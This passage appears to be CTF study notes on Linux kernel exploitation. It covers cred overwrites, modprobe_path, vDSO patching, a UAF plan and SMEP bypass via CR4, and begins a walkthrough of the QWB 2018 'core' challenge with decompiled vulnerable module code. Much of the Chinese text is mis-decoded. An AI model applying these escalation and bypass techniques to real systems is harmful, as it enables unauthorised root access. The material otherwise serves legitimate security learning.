(<del>è¿˜æœ‰æˆ‘æ€ä¹ˆçœ‹åˆ°UAFä¸€ç‚¹éƒ½ä¸æ•æ„Ÿ.</del>)</p><p>smapæ˜æ˜åœ¨pwn.collegeä¸Šè§åˆ°è¿‡äº†, çœ‹æ¥è¿‡ä¸€éæ¦‚å¿µè¿˜æ˜¯æ²¡æ³•ç•™ä¸‹æ·±åˆ»çš„å°è±¡, ä¹‹å‰çš„å†å¤ä¹ å¤ä¹ .</p><h2 id="Kernel-Mode"><a href="#Kernel-Mode" class="headerlink" title="Kernel Mode"></a>Kernel Mode</h2><ul><li><a href="https://en.wikipedia.org/wiki/Read-copy-update">Read-copy-update</a> : RCU <ul><li>in kernel code may use <code>__rcu</code> before variable to indicate the use of RCU.</li></ul></li><li>kallsym file info type: <a href="https://developer.aliyun.com/article/53679">link</a> </li></ul><h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><h4 id="change-self-æ”¹å˜è‡ªèº«æƒé™"><a href="#change-self-æ”¹å˜è‡ªèº«æƒé™" class="headerlink" title="change self: æ”¹å˜è‡ªèº«æƒé™."></a>change self: æ”¹å˜è‡ªèº«æƒé™.</h4><ul><li>task_struct and cred and other pointers utilization.</li></ul><h4 id="change-others-æ”¹å˜é«˜æƒé™è¿›ç¨‹çš„æ§åˆ¶æµ"><a href="#change-others-æ”¹å˜é«˜æƒé™è¿›ç¨‹çš„æ§åˆ¶æµ" class="headerlink" title="change others: æ”¹å˜é«˜æƒé™è¿›ç¨‹çš„æ§åˆ¶æµ."></a>change others: æ”¹å˜é«˜æƒé™è¿›ç¨‹çš„æ§åˆ¶æµ.</h4><p><strong>CHANGE DATA</strong> :</p><ul><li><p><code>call_usermodehelper</code> åªèƒ½è¯´æ˜¯å‘Šè¯‰äº†æˆ‘æœ‰è¿™ä¹ˆä¸€ç§æ–¹å¼, ä½†æ˜¯æ›´å…·ä½“çš„ç»†èŠ‚è¿˜å¾—æœå…¶ä»–çš„ä¸œè¥¿.<br><a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">post</a> | <a href="https://www.anquanke.com/post/id/236126">another post with several exp.</a> </p></li><li><p><code>poweroff_cmd</code> when exec <code>init</code> or <code>poweroff</code> command in shell. </p></li></ul><p><strong>CHANGE CODE</strong> : </p><ul><li>revise code in <strong>vDSO</strong>(virtual dynamic shared object).</li></ul><blockquote><p><em><strong>in Linux man page</strong></em>: </p><p> The â€œvDSOâ€ (virtual dynamic shared object) is a small shared library that the kernel automatically maps into the address space of all user-space applications.</p></blockquote><p>locate vDSO:</p><ul><li>in IDA: first find <code>init_vdso()</code>, then click <code>vsdo_image_64</code> variable, and then we can find the address of raw_data, which can be used to address the true vDSO.</li><li>in Memory: <ul><li>directly: vDSO is in fact a ELF file. we can locate the function name string in memory to figure out the address of vDSO.</li><li>indrectly: the vDSO is at a constant offset from kernel base.</li></ul></li></ul><h3 id="Information-disclosure-amp-DoS"><a href="#Information-disclosure-amp-DoS" class="headerlink" title="Information disclosure &amp; DoS"></a>Information disclosure &amp; DoS</h3><h3 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h3><h4 id="SMEP-amp-SMAP"><a href="#SMEP-amp-SMAP" class="headerlink" title="SMEP &amp; SMAP"></a>SMEP &amp; SMAP</h4><h5 id="å¼€å¯"><a href="#å¼€å¯" class="headerlink" title="å¼€å¯"></a>å¼€å¯</h5><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒSMEP ä¿æŠ¤æ˜¯å¼€å¯çš„ã€‚</p><p>å¦‚æœæ˜¯ä½¿ç”¨ qemu å¯åŠ¨çš„å†…æ ¸ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>-append</code> é€‰é¡¹ä¸­æ·»åŠ  <code>+smep</code> æ¥å¼€å¯ SMEPã€‚</p><h5 id="å…³é—­"><a href="#å…³é—­" class="headerlink" title="å…³é—­"></a>å…³é—­</h5><p>åœ¨ <code>/etc/default/grub</code> çš„å¦‚ä¸‹ä¸¤è¡Œä¸­æ·»åŠ  nosmep</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">GRUB_CMDLINE_LINUX_DEFAULT</span>=<span class="hljs-string">&quot;quiet&quot;</span>  <br><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;initrd=/install/initrd.gz&quot;</span><br></code></pre></div></td></tr></table></figure><p>ç„¶åè¿è¡Œ <code>update-grub</code> å¹¶ä¸”é‡å¯ç³»ç»Ÿå°±å¯ä»¥å…³é—­ smepã€‚</p><blockquote><p><em><strong>What is GRUB(Grand Unified Bootloader)?</strong></em> </p><p>GRUB is the default bootloader for many of the Linux distributions. </p><p>-&gt; <a href="https://opensource.com/article/17/3/introduction-grub2-configuration-linux">more details</a> &lt;- </p></blockquote><p>å¦‚æœæ˜¯ä½¿ç”¨ qemu å¯åŠ¨çš„å†…æ ¸ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>-append</code> é€‰é¡¹ä¸­æ·»åŠ  <code>nosmep</code> æ¥å…³é—­ SMEPã€‚</p><h5 id="æŸ¥çœ‹"><a href="#æŸ¥çœ‹" class="headerlink" title="æŸ¥çœ‹"></a>æŸ¥çœ‹</h5><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> smep <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></div></td></tr></table></figure><h5 id="Attack-SMEP"><a href="#Attack-SMEP" class="headerlink" title="Attack SMEP"></a>Attack SMEP</h5><p>æŠŠ <code>CR4</code> å¯„å­˜å™¨ä¸­çš„ç¬¬ 20 ä½ ç½®ä¸º 0 åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ 0x6f0 æ¥è®¾ç½® CR4ï¼Œè¿™æ · SMAP å’Œ SMEP éƒ½ä¼šè¢«å…³é—­ã€‚ </p><p>å†…æ ¸ä¸­ä¿®æ”¹ cr4 çš„ä»£ç æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>native_write_cr4</code>ï¼Œå½“æˆ‘ä»¬èƒ½å¤ŸåŠ«æŒæ§åˆ¶æµåï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå†…æ ¸ä¸­çš„ gadget æ¥ä¿®æ”¹ CR4ã€‚ä»å¦å¤–ä¸€ä¸ªç»´åº¦æ¥çœ‹ï¼Œå†…æ ¸ä¸­å­˜åœ¨å›ºå®šçš„ä¿®æ”¹ cr4 çš„ä»£ç ï¼Œæ¯”å¦‚åœ¨ <code>refresh_pce</code> å‡½æ•°ã€<code>set_tsc_mode</code> ç­‰å‡½æ•°é‡Œéƒ½æœ‰ã€‚</p><p><code>copy_from/to_user</code> : åœ¨åŠ«æŒæ§åˆ¶æµåï¼Œæ”»å‡»è€…å¯ä»¥è°ƒç”¨ <code>copy_from_user</code> å’Œ <code>copy_to_user</code> æ¥è®¿é—®ç”¨æˆ·æ€çš„å†…å­˜ã€‚è¿™ä¸¤ä¸ªå‡½æ•°ä¼šä¸´æ—¶æ¸…ç©ºç¦æ­¢è®¿é—®ç”¨æˆ·æ€å†…å­˜çš„æ ‡å¿—ã€‚</p><h4 id="KPTI-Kernel-Page-Table-Isolation-Â¶"><a href="#KPTI-Kernel-Page-Table-Isolation-Â¶" class="headerlink" title="KPTI - Kernel Page Table Isolation Â¶"></a>KPTI - Kernel Page Table Isolation <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/kpti/#_4">Â¶</a></h4><p>utilization method</p><h4 id="Internal-Isolation-WiKi"><a href="#Internal-Isolation-WiKi" class="headerlink" title="Internal Isolation WiKi"></a>Internal Isolation <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/inner-kernel/heap-chunk/">WiKi</a></h4><ul><li>Key: <strong>a cache with SLAB_ACCOUNT <u>cannot</u> be merged with a cache w/o SLAB_ACCOUNT</strong>, that is, used for dedicated purpose.</li></ul><blockquote><p>__GFP_ACCOUNT: <a href="https://www.kernel.org/doc/html/v5.8/core-api/memory-allocation.html#:~:text=Untrusted%20allocations%20triggered%20from%20userspace">Kernel doc</a> (GFP -&gt; Get Free Pages)</p><ul><li>Untrusted allocations triggered from userspace should be a subject of kmem accounting and must have <code>__GFP_ACCOUNT</code> bit set. There is the handy <code>GFP_KERNEL_ACCOUNT</code> shortcut for <code>GFP_KERNEL</code> allocations that should be accounted.</li></ul></blockquote><blockquote><p><em><strong>memcg(memory cgroup) &amp; cgroups</strong></em>: <a href="https://www.ibm.com/docs/en/spectrum-symphony/7.3.0?topic=limits-control-groups-cgroups-limiting-resource-usage-linux">IBM doc</a> </p><p>The memory subsystem of the cgroups feature <strong>isolates the memory behavior of a group of processes (tasks) from the rest of the system</strong>. It reports on memory resources used by the processes in a cgroup, and sets limits on memory used by those processes.</p></blockquote><blockquote><p><code>kmem-cache-create()</code>: <a href="https://docs.oracle.com/cd/E86824_01/html/E54779/kmem-cache-create-9f.html">link</a> </p><p><em><strong>What is cache in Linux?</strong></em> </p><p>â€¦ not clear, only know that it is used by <code>kmem_cache_create</code>. </p><p><em><strong>What functions use this feature?</strong></em> </p><p><code>kmem_cache_create()</code> <code>kmem_cache_alloc()</code> </p><p>It will allocate objects from a dedicated <strong>slab</strong> cache created by <code>kmem_cache_create</code>. If you specifically want a better slab cache management dedicated to your module only, use <code>kmem_cache_create</code> followed by <code>kmem_cache_alloc</code>. USB/SCSI drivers use this. <code>kmem_cache_create</code> takes sizeof your object you want to create slab of, a name which appears in /proc/slabinfo and flags to govern behavior of your slab cache.</p><blockquote><p><code>kmalloc()</code> malloc an aligned space, start from 32 bytes. -&gt; <a href="https://elixir.bootlin.com/linux/v3.9.11/source/mm/slab.c#L325">src is here</a> &lt;- | -&gt; <a href="https://www.kernel.org/doc/html/latest/core-api/memory-allocation.html#:~:text=The%20maximal%20size%20of%20a%20chunk%20that%20can%20be%20allocated%20with%20kmalloc%20is%20limited.%20The%20actual%20limit%20depends%20on%20the%20hardware%20and%20the%20kernel%20configuration%2C%20but%20it%20is%20a%20good%20practice%20to%20use%20kmalloc%20for%20objects%20smaller%20than%20page%20size.">doc is here</a> &lt;-</p></blockquote></blockquote><p>æœ‰å…³äºkmallocè®°å½•åœ¨å¦å¤–ä¸€ç¯‡. </p><h3 id="Info-Disclosure-WiKi"><a href="#Info-Disclosure-WiKi" class="headerlink" title="Info Disclosure WiKi"></a>Info Disclosure <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/access-control/information-disclosure/">WiKi</a></h3><p>dmesg_restrict | kptr_restrict</p><h3 id="Randomization"><a href="#Randomization" class="headerlink" title="Randomization"></a>Randomization</h3><p>KASLR</p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/">FG-KASLR</a> : ä¸»è¦æ˜¯åœ¨FG-KASLRçš„ç¯å¢ƒä¸‹è¿˜æœ‰å“ªäº›å¯åˆ©ç”¨çš„åœ°æ–¹.</p><h3 id="kernel-UAFÂ¶"><a href="#kernel-UAFÂ¶" class="headerlink" title="kernel UAFÂ¶"></a>kernel UAF<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/#kernel-uaf">Â¶</a></h3><p>ä¸»è¦æ˜¯å†…æ ¸ä¸­å†…å­˜åˆ†é…ç®¡ç†çš„åˆ©ç”¨, å³æ™®é€šå †å—é‡Šæ”¾åè¢«credç»“æ„ä½“çš„mallocåˆ†é…(å› ä¸ºå¤§å°ä¸€è‡´), ç„¶åä½¿ç”¨å¦ä¸€ç¨‹åºå¯¹åŸæŒ‡é’ˆçš„æ“ä½œä¿®æ”¹credä¸ºrootæƒé™. è¿™ä¸ªå†…å­˜ç®¡ç†ç‰¹æ€§å’Œä¸Šé¢çš„linux cacheæœ‰å…³ç³».</p><p>é‚£ä¹ˆæ ¹æ® UAF çš„æ€æƒ³ï¼Œæ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>æ‰“å¼€ä¸¤æ¬¡è®¾å¤‡ï¼Œé€šè¿‡ ioctl æ›´æ”¹å…¶å¤§å°ä¸º cred ç»“æ„ä½“çš„å¤§å°</li><li>é‡Šæ”¾å…¶ä¸­ä¸€ä¸ªï¼Œfork ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–°è¿›ç¨‹çš„ cred çš„ç©ºé—´å°±ä¼šå’Œä¹‹å‰é‡Šæ”¾çš„ç©ºé—´é‡å </li><li>åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å¯¹è¿™å—ç©ºé—´å†™ï¼Œåªéœ€è¦å°† uidï¼Œgid æ”¹ä¸º 0ï¼Œå³å¯ä»¥å®ç°ææƒåˆ° root</li></ol><h3 id="Kernel-ROP-amp-è¿‡ç¨‹ç¤ºä¾‹"><a href="#Kernel-ROP-amp-è¿‡ç¨‹ç¤ºä¾‹" class="headerlink" title="Kernel ROP &amp; è¿‡ç¨‹ç¤ºä¾‹"></a>Kernel ROP &amp; è¿‡ç¨‹ç¤ºä¾‹</h3><blockquote><p><strong>å¼ºç½‘æ¯2018-pwn-kernel-core</strong> </p><p>çœ‹åˆ°skrå¸ˆå‚…æ—©åœ¨18å¹´çš„wp, ä¸€æ­¥ä¸€æ­¥æ¥å¾ˆè¯¦ç»†, å‚è€ƒè§-&gt;<a href="https://eternalsakura13.com/2018/03/31/b_core/">è¿™é‡Œ</a>, WiKiä¸Šä¹Ÿæœ‰ç›¸åº”å†…å®¹. æˆ‘è‡ªå·±è¯•ä¸€è¯•.</p></blockquote><ul><li>extract <code>vmlinux</code> from command line. <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">script</a> </li><li>ROP <a href="https://github.com/sashs/Ropper">searcher</a> </li></ul><p>é¦–å…ˆä¸‹è½½.taræ–‡ä»¶, ç„¶åè§£å‹:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">pc wget &quot;https://github.com/eternalsakura/ctf_pwn/raw/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar&quot;<br>ll<br><br>â”Œâ”€â”€(rootğŸ’€kali)-[/mnt/hgfs/LearingList/CTF/QWB-core]<br>â””â”€# ll<br>total 46653<br>-rwxrwxrwx 1 root root  7029056 Mar 23  2018 bzImage<br>drwxrwxrwx 1 root root     4096 Jul 16 20:39 core<br>-rwxrwxrwx 1 root root      233 Jul 16 20:25 start.sh<br>-rwxrwxrwx 1 root root 40738712 Mar 24  2018 vmlinux<br></code></pre></div></td></tr></table></figure><p>coreæ˜¯ä½¿ç”¨<code>cpio -idm &lt; core.cpio</code>å‘½ä»¤extractä¹‹åçš„æ–‡ä»¶å¤¹, å¹¶æ²¡æœ‰é‡å‘½åä¹‹åå†ä½¿ç”¨gunzip, å—¯, æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ, åè€Œç”¨é‚£ç§æ–¹æ³•gunzipä¼šå‘Šè¯‰æˆ‘æ— æ³•è¯†åˆ«æ–‡ä»¶æ ¼å¼. </p><p>start.sh:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash"> line 7 kaslr can be removed when debugging.</span><br>qemu-system-x86_64 \<br>-m 128M\<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \ #boot config.<br>-s  \ #means open a gdbserver on TCP port 1234 at default.<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><p>.cpioä¸­åŒ…å«ä»¥ä¸‹æ–‡ä»¶:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">â”Œâ”€â”€(rootğŸ’€kali)-[/mnt/â€¦/LearingList/CTF/QWB-core/core]<br>â””â”€# l <br>bin/  core.cpio*  core.ko*  etc/  gen_cpio.sh*  init*  lib/  lib64/  proc/  root/  sbin/  sys/  tmp/  usr/  vmlinux*<br></code></pre></div></td></tr></table></figure><p><strong>core.ko</strong> is kernel module, <strong>gen_cpio.sh</strong> can be used to regenerate the archive after revision. <strong>vmlinux</strong> is the kernel image. <strong>init</strong> is (????) init file. <del>but i dont know when it will be executed.</del>  </p><p>æ³¨æ„å¦‚æœè¦ç¼–è¯‘å†…æ ¸æ¨¡å—åˆ™éœ€è¦å†…æ ¸æºç , ä½¿ç”¨makeå‘½ä»¤æ¥ç¼–è¯‘, ä½†æ˜¯å®é™…ä¸Šå¹¶ä¸éœ€è¦è¿™ä¹ˆåš. </p><p>init file:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms    # notice this line. I can get ksyms address from here.<br>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2.<br>insmod /core.ko<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">poweroff -d 120 -f &amp;       <span class="hljs-comment"># comment this line to disable auto timer shutdown</span></span><br>                         # but i dont know how that happends, it only show `Too many arguments`<br>                         # on my kali linux 2022.2<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">poweroff -d 0  -f</span><br></code></pre></div></td></tr></table></figure><blockquote><p>å±…ç„¶æ‰‹è´±åœ¨ä¸»æœºé‡Œæ‰§è¡Œäº†init, ç»™æˆ‘æ‰§è¡Œäº†ä¸€å †å¥‡æ€ªå‘½ä»¤â€¦.æˆ‘è¿˜æ²¡å¼„å¿«ç…§â€¦..è¿˜å¥½æ²¡å•¥äº‹.</p><p>ç°åœ¨ä¿®æ”¹initæ–‡ä»¶, é‡æ–°æ‰“åŒ…åè¿è¡Œç³»ç»Ÿç›´æ¥initæ‰§è¡Œé”™è¯¯. çœŸæ˜¯ç¥å¥‡å•Š.</p><p>æ€»ä¸èƒ½æ˜¯æƒé™é—®é¢˜å§â€¦. ä»å„ç§æ„ä¹‰ä¸Šæ¥è¯´, è¿™å¾ˆç¦»è°±.</p><p>çªç„¶åˆæˆåŠŸäº†, ç„å­¦çš„ç¯å¢ƒ.. å“¦æˆ‘çŸ¥é“ä¸ºä»€ä¹ˆäº†:</p></blockquote><p><strong>åœ¨å…±äº«æ–‡ä»¶å¤¹ä¸‹æ— æ³•åˆ›å»ºç¬¦å·é“¾æ¥</strong>, æ‰€ä»¥é‡æ–°æ‰“åŒ…ä¹‹å‰/binä¸‹é¢æ²¡æœ‰busyboxçš„é…ç½®. ç›´æ¥ç§»è‡³/rootä¸‹.</p><p>ç„¶åæ˜¯core.ko.</p><p>init_module:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 <span class="hljs-title">init_module</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  core_proc = proc_create(<span class="hljs-string">&quot;core&quot;</span>, <span class="hljs-number">438LL</span>, <span class="hljs-number">0LL</span>, &amp;core_fops); <span class="hljs-comment">//ç®€å•çš„åˆ›å»ºprocæ–‡ä»¶</span><br>  printk(&amp;unk_2DE);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>read:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">core_read</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-keyword">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br><br>  v6 = __readgsqword(<span class="hljs-number">0x28</span>u);                    <span class="hljs-comment">// å¼€äº†canary</span><br>  printk(&amp;unk_25B);                             <span class="hljs-comment">// &quot;core: called core_read&quot;</span><br>  printk(&amp;unk_275, off, a1);                    <span class="hljs-comment">// &quot;%d %p&quot;, off, a1</span><br>  v2 = v5;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">16LL</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v2 = <span class="hljs-number">0</span>;<br>    v2 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);<br>  result = copy_to_user(a1, &amp;v5[off], <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">if</span> ( !result )<br>    <span class="hljs-keyword">return</span> __readgsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>  __asm &#123; swapgs &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>write:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">core_write</span><span class="hljs-params">(__int64 a1, __int64 a2, <span class="hljs-keyword">unsigned</span> __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  printk(&amp;unk_215);                             <span class="hljs-comment">// &quot;core: called core_writen&quot;</span><br>  <span class="hljs-keyword">if</span> ( a3 &lt;= <span class="hljs-number">2048</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )<span class="hljs-comment">// 2048 bytes in @name</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)a3;<br>  printk(&amp;unk_230);                             <span class="hljs-comment">// &quot;core: error copying data from userspacen&quot;</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFF2</span>LL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ioctl:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">core_ioctl</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">switch</span> ( (_DWORD)a2 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889B</span>:<br>      core_read(a3);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889C</span>:<br>      printk(&amp;unk_2CD, a3);                     <span class="hljs-comment">// &quot;core: %d&quot;, a3</span><br>      off = a3;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889A</span>:<br>      printk(&amp;unk_2B3);                         <span class="hljs-comment">// &quot;core: called core_copy&quot;</span><br>      core_copy_func(a3);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>copy_func:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">core_copy_func</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  _QWORD v2[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br><br>  v3 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_215);                             <span class="hljs-comment">// &quot;core: called core_copy&quot;</span><br>  <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">63</span> )<br>  &#123;<br>    printk(&amp;unk_2A1);                           <span class="hljs-comment">// &quot;Detect Overflow&quot;</span><br>    result = <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = <span class="hljs-number">0LL</span>;<br>    qmemcpy(v2, &amp;name, (<span class="hljs-keyword">unsigned</span> __int16)a1);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯xrefçš„ä½¿ç”¨, æˆ‘çœ‹åˆ°çš„éƒ½æ˜¯å¼•ç”¨è€Œä¸æ˜¯å†™å…¥å°±ä»¥ä¸ºæ²¡æœ‰ç›¸å…³ä»£ç , 